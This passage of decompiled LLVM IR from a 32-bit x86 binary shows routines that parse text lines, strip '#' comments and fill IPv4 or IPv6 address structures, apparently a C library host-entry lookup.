  %v2_80563ee = inttoptr i32 %v1_80563ee to i8*
  %v3_80563ee = load i8, i8* %v2_80563ee, align 1
  %v4_80563ee = zext i8 %v3_80563ee to i32
  %v2_80563f2 = mul nuw nsw i32 %v4_80563ea, 256
  %v1_80563f5 = add i32 %v0_80563ea, 10
  %v2_80563f8 = or i32 %v4_80563ee, %v2_80563f2
  store i32 %v2_80563f8, i32* @edx, align 4
  %v1_80563fa = load i32, i32* @ebp, align 4
  %v2_80563fa = add i32 %v1_80563fa, 20
  %v3_80563fa = inttoptr i32 %v2_80563fa to i32*
  store i32 %v1_80563f5, i32* %v3_80563fa, align 4
  %v0_80563fd = load i32, i32* @edx, align 4
  %v1_80563fd = load i32, i32* @ebp, align 4
  %v2_80563fd = add i32 %v1_80563fd, 16
  %v3_80563fd = inttoptr i32 %v2_80563fd to i32*
  store i32 %v0_80563fd, i32* %v3_80563fd, align 4
  %v1_8056407 = add i32 %v3_8056373, 10
  %v1_805640a = load i32, i32* @ebp, align 4
  %v2_805640a = add i32 %v1_805640a, 24
  %v3_805640a = inttoptr i32 %v2_805640a to i32*
  store i32 %v1_8056407, i32* %v3_805640a, align 4
  %v4_805640d = load i32, i32* @edx, align 4
  %v5_8056411 = icmp slt i32 %v1_805637b, %v4_805640d
  br i1 %v5_8056411, label %dec_label_pc_8056413, label %dec_label_pc_8056418

dec_label_pc_8056413:                             ; preds = %dec_label_pc_805638b
  br label %dec_label_pc_805641c

dec_label_pc_8056418:                             ; preds = %dec_label_pc_805638b
  %v1_8056418 = load i32, i32* @edi, align 4
  %v2_8056418 = add i32 %v4_805640d, 10
  %v3_8056418 = add i32 %v2_8056418, %v1_8056418
  br label %dec_label_pc_805641c

dec_label_pc_805641c:                             ; preds = %dec_label_pc_8056330, %dec_label_pc_8056413, %dec_label_pc_8056384, %dec_label_pc_8056418
  %v0_8056422 = phi i32 [ %v4_8056361, %dec_label_pc_8056330 ], [ -1, %dec_label_pc_8056413 ], [ %v1_805637b, %dec_label_pc_8056384 ], [ %v3_8056418, %dec_label_pc_8056418 ]
  %v2_8056424 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056424, i32* @ebx, align 4
  store i32 %v0_8056332, i32* @esi, align 4
  store i32 %v0_8056331, i32* @edi, align 4
  store i32 %v0_8056330, i32* @ebp, align 4
  ret i32 %v0_8056422

; uselistorder directives
  uselistorder i32 %v1_805637b, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8056373, { 1, 0, 2 }
  uselistorder i32 %v4_8056361, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8056354, { 1, 0 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9, 12, 11 }
  uselistorder i32 3, { 37, 38, 39, 40, 41, 42, 24, 3, 25, 16, 36, 7, 43, 26, 9, 8, 4, 1, 2, 0, 27, 5, 28, 32, 17, 33, 30, 44, 18, 19, 31, 29, 15, 11, 12, 10, 13, 34, 35, 14, 20, 21, 22, 23, 6 }
  uselistorder i32 (i32)* @function_8055bfc, { 2, 1, 0 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805641c, { 3, 1, 2, 0 }
}

define i32 @function_805642c() local_unnamed_addr {
dec_label_pc_805642c:
  %v3_8056439 = call i32 @function_80553f8(i32 ptrtoint ([11 x i8]* @global_var_805c985.415 to i32), i32 ptrtoint (i32* @global_var_805c950.400 to i32))
  store i32 %v3_8056439, i32* @eax, align 4
  %v1_8056441 = icmp eq i32 %v3_8056439, 0
  %v1_8056443 = icmp eq i1 %v1_8056441, false
  br i1 %v1_8056443, label %dec_label_pc_8056459, label %dec_label_pc_8056445

dec_label_pc_8056445:                             ; preds = %dec_label_pc_805642c
  %v3_8056451 = call i32 @function_80553f8(i32 ptrtoint ([18 x i8]* @global_var_805c990.416 to i32), i32 ptrtoint (i32* @global_var_805c950.400 to i32))
  br label %dec_label_pc_8056459

dec_label_pc_8056459:                             ; preds = %dec_label_pc_805642c, %dec_label_pc_8056445
  %v0_805645c = phi i32 [ %v3_8056439, %dec_label_pc_805642c ], [ %v3_8056451, %dec_label_pc_8056445 ]
  ret i32 %v0_805645c

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_80553f8, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805c950.400 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8056459, { 1, 0 }
}

define i32 @function_805645d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_805645d:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_805645d = load i32, i32* @ebp, align 4
  %v0_805645e = load i32, i32* @edi, align 4
  %v0_805645f = load i32, i32* @esi, align 4
  %v0_8056460 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_805646e = sub i32 0, %arg6
  %v1_8056470 = urem i32 %v1_805646e, 4
  %v2_8056470 = icmp eq i32 %v1_8056470, 0
  store i32 %v1_8056470, i32* %eax.global-to-local, align 4
  br i1 %v2_8056470, label %dec_label_pc_8056481, label %dec_label_pc_8056475

dec_label_pc_8056475:                             ; preds = %dec_label_pc_805645d
  %v2_8056475 = sub i32 %arg7, %v1_8056470
  %v7_8056475 = icmp ugt i32 %v1_8056470, %arg7
  br i1 %v7_8056475, label %dec_label_pc_8056725, label %dec_label_pc_805647d

dec_label_pc_805647d:                             ; preds = %dec_label_pc_8056475
  %v2_805647d = add i32 %v1_8056470, %arg6
  store i32 %v2_805647d, i32* @ebx, align 4
  store i32 %v2_8056475, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056481

dec_label_pc_8056481:                             ; preds = %dec_label_pc_805645d, %dec_label_pc_805647d
  %v0_805648a = phi i32 [ %arg6, %dec_label_pc_805645d ], [ %v2_805647d, %dec_label_pc_805647d ]
  %v0_805648d = phi i32 [ %arg7, %dec_label_pc_805645d ], [ %v2_8056475, %dec_label_pc_805647d ]
  %tmp148 = icmp ult i32 %v0_805648d, 32
  br i1 %tmp148, label %dec_label_pc_8056725, label %dec_label_pc_805648a

dec_label_pc_805648a:                             ; preds = %dec_label_pc_8056481
  %v1_805648a = add i32 %v0_805648a, 32
  store i32 %v1_805648a, i32* %eax.global-to-local, align 4
  %v1_805648d = add i32 %v0_805648d, -32
  store i32 %v1_805648d, i32* @ebp, align 4
  %v5_8056490 = inttoptr i32 %v1_805648a to i8*
  %v12_8056494 = icmp eq i32 %arg4, 1
  br i1 %v12_8056494, label %dec_label_pc_80565b6, label %dec_label_pc_805649f

dec_label_pc_805649f:                             ; preds = %dec_label_pc_805648a
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_80564a6 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_80564a6, align 4
  %tmp149 = icmp ult i32 %v1_805648d, 4
  br i1 %tmp149, label %dec_label_pc_8056725, label %dec_label_pc_80564b2

dec_label_pc_80564b2:                             ; preds = %dec_label_pc_805649f
  %v0_80564b2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80564b2 = add i32 %v0_80564b2, -36
  store i32 %v1_80564b2, i32* %eax.global-to-local, align 4
  %tmp150 = icmp ult i32 %v1_80564b2, 8
  br i1 %tmp150, label %dec_label_pc_8056725, label %dec_label_pc_80564be

dec_label_pc_80564be:                             ; preds = %dec_label_pc_80564b2
  %v0_80564be = load i32, i32* @ebp, align 4
  %tmp151 = icmp ult i32 %v0_80564be, 16
  br i1 %tmp151, label %dec_label_pc_8056725, label %dec_label_pc_80564c7

dec_label_pc_80564c7:                             ; preds = %dec_label_pc_80564be
  %v1_80564c7 = add i32 %v0_80564b2, -48
  store i32 %v1_80564c7, i32* %eax.global-to-local, align 4
  %tmp152 = icmp ult i32 %v1_80564c7, 8
  br i1 %tmp152, label %dec_label_pc_8056725, label %dec_label_pc_80564d3

dec_label_pc_80564d3:                             ; preds = %dec_label_pc_80564c7
  %v0_80564d3 = load i32, i32* @ebx, align 4
  %v1_80564d3 = add i32 %v0_80564d3, 48
  %v1_80564d6 = add i32 %v0_80564b2, -44
  store i32 %v1_80564d6, i32* @ebp, align 4
  %v1_80564dd = add i32 %v0_80564b2, -56
  store i32 %v1_80564dd, i32* @eax, align 4
  %v1_80564e0 = add i32 %v0_80564d3, 36
  store i32 %v1_80564e0, i32* @edi, align 4
  %v7_80564e3 = icmp ult i32 %v1_80564dd, %v1_80564d6
  br i1 %v7_80564e3, label %dec_label_pc_80564ec, label %dec_label_pc_80564e7

dec_label_pc_80564e7:                             ; preds = %dec_label_pc_80564d3
  %v1_80564e7 = add i32 %v0_80564d3, 44
  store i32 %v1_80564e7, i32* @esi, align 4
  br label %dec_label_pc_80564f1

dec_label_pc_80564ec:                             ; preds = %dec_label_pc_80564d3
  %v1_80564ec = add i32 %v0_80564d3, 56
  store i32 %v1_80564ec, i32* @esi, align 4
  store i32 %v1_80564dd, i32* @ebp, align 4
  br label %dec_label_pc_80564f1

dec_label_pc_80564f1:                             ; preds = %dec_label_pc_80564e7, %dec_label_pc_80564ec
  %v0_80564f1 = phi i32 [ %v1_80564d6, %dec_label_pc_80564e7 ], [ %v1_80564dd, %dec_label_pc_80564ec ]
  %tmp153 = icmp ult i32 %v0_80564f1, 80
  br i1 %tmp153, label %dec_label_pc_8056725, label %dec_label_pc_80564fa

dec_label_pc_80564fa:                             ; preds = %dec_label_pc_80564f1
  %v0_80564fa = call i32 @function_805642c()
  store i32 %v0_80564fa, i32* %eax.global-to-local, align 4
  %v1_8056503 = icmp eq i32 %v0_80564fa, 0
  br i1 %v1_8056503, label %dec_label_pc_8056527, label %dec_label_pc_8056507

dec_label_pc_8056507:                             ; preds = %dec_label_pc_80564fa
  store i32 %v1_805648a, i32* %edx.global-to-local, align 4
  store i32 %v1_80564d3, i32* %eax.global-to-local, align 4
  store i8* %v5_8056490, i8** %stack_var_-44, align 4
  %v0_8056512 = load i32, i32* @edi, align 4
  %v0_805651e = load i32, i32* @esi, align 4
  %v5_805651e = inttoptr i32 %v0_805651e to i8*
  br label %dec_label_pc_80565d5

dec_label_pc_8056527:                             ; preds = %dec_label_pc_80564fa
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_805652b = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_805652b, align 4
  %v1_8056531 = call i32 @function_8050568(i32 0)
  store i32 %v1_8056531, i32* %eax.global-to-local, align 4
  %v1_8056536 = inttoptr i32 %v1_8056531 to i32*
  %v2_8056536 = load i32, i32* %v1_8056536, align 4
  store i32 %v2_8056536, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056725

dec_label_pc_8056541:                             ; preds = %dec_label_pc_80566a8
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8056545 = load i8*, i8** %stack_var_-44, align 4
  %v3_8056545 = ptrtoint i8* %v2_8056545 to i32
  %v2_8056548 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8056545, i32* %v2_8056548, align 4
  %v0_805654a = load i32, i32* %eax.global-to-local, align 4
  %v1_805654a = add i32 %v0_805654a, 4
  %v2_805654a = inttoptr i32 %v1_805654a to i32*
  store i32 0, i32* %v2_805654a, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8056555 = load i32, i32* @ebx, align 4
  %v1_8056555 = add i32 %v0_8056555, 4
  %v2_8056555 = inttoptr i32 %v1_8056555 to i32*
  %v3_8056555 = load i32, i32* %v2_8056555, align 4
  store i32 %v3_8056555, i32* %eax.global-to-local, align 4
  store i32 %v3_8056555, i32* %arg5, align 4
  %v0_805655a = load i32, i32* %edx.global-to-local, align 4
  %v1_805655a = add i32 %v0_805655a, 8
  %v2_805655a = inttoptr i32 %v1_805655a to i32*
  store i32 2, i32* %v2_805655a, align 4
  %v0_8056561 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056561 = add i32 %v0_8056561, 12
  %v2_8056561 = inttoptr i32 %v1_8056561 to i32*
  store i32 4, i32* %v2_8056561, align 4
  br label %dec_label_pc_805659a

dec_label_pc_805656e:                             ; preds = %dec_label_pc_80566ca
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_8056576 = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8056576, align 4
  %v0_8056578 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056578 = add i32 %v0_8056578, 4
  %v2_8056578 = inttoptr i32 %v1_8056578 to i32*
  store i32 0, i32* %v2_8056578, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8056583 = load i32, i32* @ebx, align 4
  %v1_8056583 = add i32 %v0_8056583, 4
  %v2_8056583 = inttoptr i32 %v1_8056583 to i32*
  %v3_8056583 = load i32, i32* %v2_8056583, align 4
  store i32 %v3_8056583, i32* %eax.global-to-local, align 4
  store i32 %v3_8056583, i32* %arg5, align 4
  %v0_8056588 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056588 = add i32 %v0_8056588, 8
  %v2_8056588 = inttoptr i32 %v1_8056588 to i32*
  store i32 10, i32* %v2_8056588, align 4
  %v0_805658f = load i32, i32* %edx.global-to-local, align 4
  %v1_805658f = add i32 %v0_805658f, 12
  %v2_805658f = inttoptr i32 %v1_805658f to i32*
  store i32 16, i32* %v2_805658f, align 4
  br label %dec_label_pc_805659a

dec_label_pc_805659a:                             ; preds = %dec_label_pc_8056541, %dec_label_pc_805656e
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8056541 ], [ %stack_var_-32.0, %dec_label_pc_805656e ]
  %v1_805659a = load i32, i32* %edx.global-to-local, align 4
  %v2_805659a = add i32 %v1_805659a, 16
  %v3_805659a = inttoptr i32 %v2_805659a to i32*
  store i32 %storemerge, i32* %v3_805659a, align 4
  %v0_805659d = load i32, i32* @ebx, align 4
  %v1_805659d = add i32 %v0_805659d, 8
  %v1_80565a0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80565a0 = add i32 %v1_80565a0, 4
  %v3_80565a0 = inttoptr i32 %v2_80565a0 to i32*
  store i32 %v1_805659d, i32* %v3_80565a0, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_80565a7 = load i32, i32* %edx.global-to-local, align 4
  %v2_80565a7 = inttoptr i32 %arg8 to i32*
  store i32 %v0_80565a7, i32* %v2_80565a7, align 4
  br label %dec_label_pc_8056705

dec_label_pc_80565b6:                             ; preds = %dec_label_pc_805648a
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_80565d5

dec_label_pc_80565d5:                             ; preds = %dec_label_pc_8056507, %dec_label_pc_80565b6
  %v1_80565d9.pre-phi = phi i32* [ %v1_80564a6, %dec_label_pc_8056507 ], [ %.pre, %dec_label_pc_80565b6 ]
  %stack_var_-32.0 = phi i32 [ %v1_80564d3, %dec_label_pc_8056507 ], [ 0, %dec_label_pc_80565b6 ]
  %stack_var_-36.0 = phi i32 [ %v1_805648a, %dec_label_pc_8056507 ], [ 0, %dec_label_pc_80565b6 ]
  %stack_var_-40.0 = phi i32 [ %v0_8056512, %dec_label_pc_8056507 ], [ 0, %dec_label_pc_80565b6 ]
  %stack_var_4.0 = phi i32 [ %v0_80564fa, %dec_label_pc_8056507 ], [ %arg1, %dec_label_pc_80565b6 ]
  %stack_var_-20.0 = phi i8* [ %v5_805651e, %dec_label_pc_8056507 ], [ %v5_8056490, %dec_label_pc_80565b6 ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_80565d9.pre-phi, align 4
  %v4_80566f1 = ptrtoint i8* %stack_var_-20.0 to i32
  %v4_805668e = inttoptr i32 %arg2 to i8*
  %v0_80566eb119126 = load i32, i32* @edx, align 4
  %v3_80566f5120127 = call i32 @function_805581c(i32 %v4_80566f1, i32 %stack_var_4.0, i32 %v0_80566eb119126)
  store i32 %v3_80566f5120127, i32* @eax, align 4
  %v1_80566fd121128 = icmp eq i32 %v3_80566f5120127, 0
  %v1_80566ff122129 = icmp eq i1 %v1_80566fd121128, false
  br i1 %v1_80566ff122129, label %dec_label_pc_80565ec.lr.ph.lr.ph, label %dec_label_pc_8056705

dec_label_pc_80565ec.lr.ph.lr.ph:                 ; preds = %dec_label_pc_80565d5
  %v12_80566c3 = icmp eq i32 %arg3, 10
  %v12_80566a1 = icmp eq i32 %arg3, 2
  %v12_8056668 = icmp eq i32 %arg4, 2
  %v1_805666d = icmp eq i1 %v12_8056668, false
  %v1_80566a6 = icmp eq i1 %v12_80566a1, false
  %v1_80566c8 = icmp eq i1 %v12_80566c3, false
  br label %dec_label_pc_80565ec.lr.ph

dec_label_pc_80565ec.lr.ph:                       ; preds = %dec_label_pc_80565ec.lr.ph.lr.ph, %dec_label_pc_80566eb.outer.backedge
  %stack_var_-28.0.ph130 = phi i32 [ 1, %dec_label_pc_80565ec.lr.ph.lr.ph ], [ 2, %dec_label_pc_80566eb.outer.backedge ]
  br label %dec_label_pc_80565ec

dec_label_pc_80565ec:                             ; preds = %dec_label_pc_80565ec.lr.ph, %dec_label_pc_80566eb.backedge
  %v3_80565f4 = call i32 @function_8051474(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_80565f4, i32* @eax, align 4
  %v1_80565fc = icmp eq i32 %v3_80565f4, 0
  br i1 %v1_80565fc, label %dec_label_pc_8056603, label %dec_label_pc_8056600

dec_label_pc_8056600:                             ; preds = %dec_label_pc_80565ec
  %v1_8056600 = inttoptr i32 %v3_80565f4 to i8*
  store i8 0, i8* %v1_8056600, align 1
  br label %dec_label_pc_8056603

dec_label_pc_8056603:                             ; preds = %dec_label_pc_80565ec, %dec_label_pc_8056600
  store i32 %v4_80566f1, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805664332 = load i8, i8* %stack_var_-20.0, align 1
  %v3_805664333 = icmp eq i8 %v2_805664332, 0
  %v1_805664639 = icmp eq i1 %v3_805664333, false
  br i1 %v1_805664639, label %dec_label_pc_805660f.preheader.preheader, label %dec_label_pc_8056648

dec_label_pc_805660f.preheader.preheader:         ; preds = %dec_label_pc_8056603
  %v4_805660f97.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805660f.preheader

dec_label_pc_805660b:                             ; preds = %dec_label_pc_8056615
  store i8 0, i8* %v1_805660f102, align 1
  %v0_805660e = load i32, i32* @ecx, align 4
  %v1_805660e = add i32 %v0_805660e, 1
  store i32 %v1_805660e, i32* @ecx, align 4
  %v1_805660f = inttoptr i32 %v1_805660e to i8*
  %v2_805660f = load i8, i8* %v1_805660f, align 1
  %v3_805660f = zext i8 %v2_805660f to i32
  %v4_805660f = load i32, i32* %eax.global-to-local, align 4
  %v5_805660f = and i32 %v4_805660f, -256
  %v6_805660f = or i32 %v5_805660f, %v3_805660f
  store i32 %v6_805660f, i32* @eax, align 4
  %v4_8056611 = icmp eq i8 %v2_805660f, 0
  br i1 %v4_8056611, label %dec_label_pc_805660f.dec_label_pc_8056648.loopexit_crit_edge, label %dec_label_pc_8056615

dec_label_pc_8056615:                             ; preds = %dec_label_pc_805660f.preheader, %dec_label_pc_805660b
  %v2_805660f103 = phi i8 [ %v2_805660f, %dec_label_pc_805660b ], [ %v2_805660f95, %dec_label_pc_805660f.preheader ]
  %v1_805660f102 = phi i8* [ %v1_805660f, %dec_label_pc_805660b ], [ %v1_805660f94, %dec_label_pc_805660f.preheader ]
  %v0_805660b101 = phi i32 [ %v1_805660e, %dec_label_pc_805660b ], [ %v0_805660f47, %dec_label_pc_805660f.preheader ]
  %v2_8056615 = sext i8 %v2_805660f103 to i32
  store i32 %v2_8056615, i32* @edx, align 4
  %v0_8056618 = load i32, i32* @global_var_805d61c, align 4
  store i32 %v0_8056618, i32* %eax.global-to-local, align 4
  %v2_805661d = mul nsw i32 %v2_8056615, 2
  %v3_805661d = add i32 %v0_8056618, %v2_805661d
  %v4_805661d = inttoptr i32 %v3_805661d to i8*
  %v5_805661d = load i8, i8* %v4_805661d, align 1
  %v6_805661d = and i8 %v5_805661d, 32
  %v7_805661d = icmp eq i8 %v6_805661d, 0
  %v1_8056621 = icmp eq i1 %v7_805661d, false
  br i1 %v1_8056621, label %dec_label_pc_805660b, label %dec_label_pc_8056623

dec_label_pc_8056623:                             ; preds = %dec_label_pc_8056615
  %v0_8056623 = load i32, i32* @edi, align 4
  %v1_8056623 = add i32 %v0_8056623, -6
  %v6_8056623 = sub i32 5, %v0_8056623
  %v7_8056623 = and i32 %v6_8056623, %v0_8056623
  %v8_8056623 = icmp slt i32 %v7_8056623, 0
  %v9_8056623 = icmp eq i32 %v1_8056623, 0
  %v10_8056623 = icmp slt i32 %v1_8056623, 0
  %v3_8056626 = icmp eq i1 %v10_8056623, %v8_8056623
  %v4_8056626 = icmp eq i1 %v9_8056623, false
  %v5_8056626 = and i1 %v4_8056626, %v3_8056626
  br i1 %v5_8056626, label %dec_label_pc_805662f.preheader, label %dec_label_pc_8056628

dec_label_pc_8056628:                             ; preds = %dec_label_pc_8056623
  %v1_8056628 = load i32, i32* @ebx, align 4
  %v3_8056628 = mul i32 %v0_8056623, 4
  %v4_8056628 = add i32 %v1_8056628, %v3_8056628
  %v5_8056628 = inttoptr i32 %v4_8056628 to i32*
  store i32 %v0_805660b101, i32* %v5_8056628, align 4
  %v0_805662b = load i32, i32* @edi, align 4
  %v1_805662b = add i32 %v0_805662b, 1
  store i32 %v1_805662b, i32* @edi, align 4
  %v0_805662f.pre.pre = load i32, i32* @ecx, align 4
  %v4_805662f.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805662f.preheader

dec_label_pc_805662f.preheader:                   ; preds = %dec_label_pc_8056628, %dec_label_pc_8056623
  %v4_805662f.pre = phi i32 [ %v4_805662f.pre.pre, %dec_label_pc_8056628 ], [ %v0_8056618, %dec_label_pc_8056623 ]
  %v0_805662f.pre = phi i32 [ %v0_805662f.pre.pre, %dec_label_pc_8056628 ], [ %v0_805660b101, %dec_label_pc_8056623 ]
  %v1_805664852 = phi i32 [ %v1_805662b, %dec_label_pc_8056628 ], [ %v0_8056623, %dec_label_pc_8056623 ]
  %v1_805662f104 = inttoptr i32 %v0_805662f.pre to i8*
  %v2_805662f105 = load i8, i8* %v1_805662f104, align 1
  %v3_805662f106 = zext i8 %v2_805662f105 to i32
  %v5_805662f107 = and i32 %v4_805662f.pre, -256
  %v6_805662f108 = or i32 %v3_805662f106, %v5_805662f107
  store i32 %v6_805662f108, i32* @eax, align 4
  %v4_8056631109 = icmp eq i8 %v2_805662f105, 0
  br i1 %v4_8056631109, label %dec_label_pc_8056643.loopexit, label %dec_label_pc_8056635.lr.ph

dec_label_pc_8056635.lr.ph:                       ; preds = %dec_label_pc_805662f.preheader
  %v0_8056638.pre = load i32, i32* @global_var_805d61c, align 4
  br label %dec_label_pc_8056635

dec_label_pc_805662e:                             ; preds = %dec_label_pc_8056635
  %v1_805662e = add i32 %v0_8056643110, 1
  store i32 %v1_805662e, i32* @ecx, align 4
  %v1_805662f = inttoptr i32 %v1_805662e to i8*
  %v2_805662f = load i8, i8* %v1_805662f, align 1
  %v3_805662f = zext i8 %v2_805662f to i32
  %v5_805662f = and i32 %v0_8056638.pre, -256
  %v6_805662f = or i32 %v3_805662f, %v5_805662f
  store i32 %v6_805662f, i32* @eax, align 4
  %v4_8056631 = icmp eq i8 %v2_805662f, 0
  br i1 %v4_8056631, label %dec_label_pc_8056643.loopexit, label %dec_label_pc_8056635

dec_label_pc_8056635:                             ; preds = %dec_label_pc_8056635.lr.ph, %dec_label_pc_805662e
  %v2_805662f112 = phi i8 [ %v2_805662f105, %dec_label_pc_8056635.lr.ph ], [ %v2_805662f, %dec_label_pc_805662e ]
  %v1_805662f111 = phi i8* [ %v1_805662f104, %dec_label_pc_8056635.lr.ph ], [ %v1_805662f, %dec_label_pc_805662e ]
  %v0_8056643110 = phi i32 [ %v0_805662f.pre, %dec_label_pc_8056635.lr.ph ], [ %v1_805662e, %dec_label_pc_805662e ]
  %v2_8056635 = sext i8 %v2_805662f112 to i32
  store i32 %v2_8056635, i32* @edx, align 4
  store i32 %v0_8056638.pre, i32* @eax, align 4
  %v2_805663d = mul nsw i32 %v2_8056635, 2
  %v3_805663d = add i32 %v0_8056638.pre, %v2_805663d
  %v4_805663d = inttoptr i32 %v3_805663d to i8*
  %v5_805663d = load i8, i8* %v4_805663d, align 1
  %v6_805663d = and i8 %v5_805663d, 32
  %v7_805663d = icmp eq i8 %v6_805663d, 0
  br i1 %v7_805663d, label %dec_label_pc_805662e, label %dec_label_pc_8056643.loopexit

dec_label_pc_8056643.loopexit:                    ; preds = %dec_label_pc_8056635, %dec_label_pc_805662e, %dec_label_pc_805662f.preheader
  %v4_805660f97143 = phi i32 [ %v6_805662f108, %dec_label_pc_805662f.preheader ], [ %v6_805662f, %dec_label_pc_805662e ], [ %v0_8056638.pre, %dec_label_pc_8056635 ]
  %v0_8056643.lcssa = phi i32 [ %v0_805662f.pre, %dec_label_pc_805662f.preheader ], [ %v1_805662e, %dec_label_pc_805662e ], [ %v0_8056643110, %dec_label_pc_8056635 ]
  %v1_805662f.lcssa = phi i8* [ %v1_805662f104, %dec_label_pc_805662f.preheader ], [ %v1_805662f, %dec_label_pc_805662e ], [ %v1_805662f111, %dec_label_pc_8056635 ]
  %v2_8056643 = load i8, i8* %v1_805662f.lcssa, align 1
  %v3_8056643 = icmp eq i8 %v2_8056643, 0
  %v1_8056646 = icmp eq i1 %v3_8056643, false
  br i1 %v1_8056646, label %dec_label_pc_805660f.preheader, label %dec_label_pc_8056648

dec_label_pc_805660f.preheader:                   ; preds = %dec_label_pc_805660f.preheader.preheader, %dec_label_pc_8056643.loopexit
  %v1_8056648.pre146 = phi i32 [ %v1_805664852, %dec_label_pc_8056643.loopexit ], [ 0, %dec_label_pc_805660f.preheader.preheader ]
  %v4_805660f97 = phi i32 [ %v4_805660f97143, %dec_label_pc_8056643.loopexit ], [ %v4_805660f97.pre, %dec_label_pc_805660f.preheader.preheader ]
  %v0_805660f47 = phi i32 [ %v0_8056643.lcssa, %dec_label_pc_8056643.loopexit ], [ %v4_80566f1, %dec_label_pc_805660f.preheader.preheader ]
  %v1_805660f94 = inttoptr i32 %v0_805660f47 to i8*
  %v2_805660f95 = load i8, i8* %v1_805660f94, align 1
  %v3_805660f96 = zext i8 %v2_805660f95 to i32
  %v5_805660f98 = and i32 %v4_805660f97, -256
  %v6_805660f99 = or i32 %v5_805660f98, %v3_805660f96
  store i32 %v6_805660f99, i32* @eax, align 4
  %v4_8056611100 = icmp eq i8 %v2_805660f95, 0
  br i1 %v4_8056611100, label %dec_label_pc_8056648, label %dec_label_pc_8056615

dec_label_pc_805660f.dec_label_pc_8056648.loopexit_crit_edge: ; preds = %dec_label_pc_805660b
  %v1_8056648.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056648

dec_label_pc_8056648:                             ; preds = %dec_label_pc_8056643.loopexit, %dec_label_pc_805660f.dec_label_pc_8056648.loopexit_crit_edge, %dec_label_pc_805660f.preheader, %dec_label_pc_8056603
  %v1_8056648 = phi i32 [ 0, %dec_label_pc_8056603 ], [ %v1_8056648.pre.pre, %dec_label_pc_805660f.dec_label_pc_8056648.loopexit_crit_edge ], [ %v1_8056648.pre146, %dec_label_pc_805660f.preheader ], [ %v1_805664852, %dec_label_pc_8056643.loopexit ]
  %v0_8056648 = load i32, i32* @ebx, align 4
  %v2_8056648 = mul i32 %v1_8056648, 4
  %v3_8056648 = add i32 %v2_8056648, %v0_8056648
  %v4_8056648 = inttoptr i32 %v3_8056648 to i32*
  store i32 0, i32* %v4_8056648, align 4
  %v0_805664f = load i32, i32* @edi, align 4
  %v7_8056652 = icmp sgt i32 %v0_805664f, 1
  br i1 %v7_8056652, label %dec_label_pc_8056658, label %dec_label_pc_80566eb.backedge

dec_label_pc_8056658:                             ; preds = %dec_label_pc_8056648
  br i1 %v12_8056494, label %dec_label_pc_8056725, label %dec_label_pc_8056663

dec_label_pc_8056663:                             ; preds = %dec_label_pc_8056658
  store i32 1, i32* @esi, align 4
  br i1 %v1_805666d, label %dec_label_pc_8056685.lr.ph, label %dec_label_pc_805666f

dec_label_pc_8056685.lr.ph:                       ; preds = %dec_label_pc_8056663
  %v0_8056685.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8056685

dec_label_pc_805666f:                             ; preds = %dec_label_pc_8056663
  %v0_805666f = load i32, i32* @eax, align 4
  %v0_8056671 = load i32, i32* @ebx, align 4
  %v1_8056671 = inttoptr i32 %v0_8056671 to i32*
  %v2_8056671 = load i32, i32* %v1_8056671, align 4
  %v5_8056677 = call i32 @function_8055b14(i8* %v4_805668e, i32 %v2_8056671, i32 %v0_805666f, i32 %v0_805666f)
  store i32 %v5_8056677, i32* %eax.global-to-local, align 4
  %v1_805667f = icmp eq i32 %v5_8056677, 0
  %v1_8056681 = icmp eq i1 %v1_805667f, false
  br i1 %v1_8056681, label %dec_label_pc_80566eb.backedge, label %dec_label_pc_80566a1

dec_label_pc_80566eb.backedge:                    ; preds = %dec_label_pc_805669a, %dec_label_pc_805666f, %dec_label_pc_8056648
  %v0_80566eb = load i32, i32* @edx, align 4
  %v3_80566f5 = call i32 @function_805581c(i32 %v4_80566f1, i32 %stack_var_4.0, i32 %v0_80566eb)
